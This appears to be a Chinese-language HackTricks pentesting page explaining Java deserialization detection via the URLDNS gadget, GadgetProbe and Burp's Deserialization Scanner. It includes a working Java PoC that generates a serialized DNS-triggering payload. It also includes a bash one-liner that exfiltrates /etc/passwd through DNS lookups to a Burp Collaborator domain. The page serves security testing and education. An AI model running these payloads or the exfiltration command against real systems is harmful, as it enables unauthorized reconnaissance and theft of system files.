# Java DNS反序列化、GadgetProbe和Java反序列化扫描器

## Java DNS反序列化、GadgetProbe和Java反序列化扫描器

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 反序列化的DNS请求

类`java.net.URL`实现了`Serializable`接口，这意味着该类可以被序列化。
```java
public final class URL implements java.io.Serializable {
```
这个类有一个奇怪的行为。根据文档：“如果两个主机名都可以解析为相同的IP地址，则认为两个主机是等效的”。\
因此，每当一个URL对象调用`equals`或`hashCode`函数时，都会发送一个DNS请求来获取IP地址。

从一个URL对象调用`hashCode`函数非常简单，只需要将该对象插入到将要被反序列化的HashMap中即可。这是因为在HashMap的`readObject`函数的末尾，会执行以下代码：
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
它将对`HashMap`中的每个值执行`putVal`。但更重要的是对每个值调用`hash`函数。这是`hash`函数的代码：
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
正如你所观察到的，当对HashMap进行反序列化时，函数`hash`将对每个对象进行执行，并在`hash`执行期间执行对象的`.hashCode()`。因此，如果你反序列化一个包含URL对象的HashMap，URL对象将执行`.hashCode()`。

现在，让我们来看一下`URLObject.hashCode()`的代码：
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
正如你所看到的，当一个`URLObject`执行`.hashCode()`时，它被称为`hashCode(this)`。接下来你可以看到这个函数的代码：
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
你可以看到一个`getHostAddress`被执行到该域名，**发起了一个DNS查询**。

因此，可以滥用这个类来**发起**一个**DNS查询**来**证明**反序列化是可能的，甚至可以用来**泄露信息**（你可以将命令执行的输出作为子域名附加上去）。

### URLDNS payload 代码示例

你可以在这里找到[ysoserial中的URDNS payload代码](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)。然而，为了更容易理解如何编写代码，我创建了自己的PoC（基于ysoserial的代码）：
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### 更多信息

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* 在原始想法中，commons collections负载已更改为执行DNS查询，这比提议的方法不太可靠，但这是帖子：[https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

您可以从Burp Suite应用商店（Extender）下载[**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)。

**GadgetProbe**将尝试确定服务器的Java类是否存在，以便您可以知道它是否容易受到某些已知漏洞的攻击。

### 工作原理

**GadgetProbe**将使用前一节中的**DNS负载**，但在运行DNS查询之前，它将**尝试反序列化任意类**。如果**任意类存在**，则将发送**DNS查询**，并且GadgProbe将记录此类的存在。如果**从未发送DNS**请求，则意味着**任意类未成功反序列化**，因此要么不存在，要么**不可序列化/可利用**。

在github中，[**GadgetProbe有一些单词列表**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)，其中包含要进行测试的Java类。

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### 更多信息

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java反序列化扫描器

可以从Burp App Store（Extender）下载此扫描器。
该**扩展**具有**被动**和**主动**的**功能**。

### 被动

默认情况下，它会**被动地检查**所有发送的请求和响应，**查找**是否存在**Java序列化的魔术字节**，如果找到任何一个，将显示漏洞警告：

![](<../../.gitbook/assets/image (290).png>)

### 主动

**手动测试**

您可以选择一个请求，右键单击并选择`Send request to DS - Manual Testing`。
然后，在_Deserialization Scanner Tab_ --> _Manual testing tab_中，您可以选择**插入点**。然后，**启动测试**（根据使用的编码选择适当的攻击）。

![](../../.gitbook/assets/3-1.png)

即使这被称为“手动测试”，它是相当**自动化**的。它将自动检查**反序列化**是否**容易受到任何ysoserial负载**的攻击，检查Web服务器上存在的库，并突出显示易受攻击的库。为了**检查易受攻击的库**，您可以选择启动**Javas Sleeps**，通过**CPU**消耗进行**sleeps**，或者使用**DNS**，正如先前提到的那样。

**利用**

一旦您确定了易受攻击的库，可以将请求发送到_Exploiting Tab_。
在此选项卡中，您必须再次**选择注入点**，并**编写**要为其创建有效负载的**易受攻击的库**和**命令**。然后，只需按下适当的**Attack**按钮。

![](<../../.gitbook/assets/4 (1).png>)

### Java反序列化DNS Exfil信息

使您的负载执行以下操作：
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### 更多信息

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
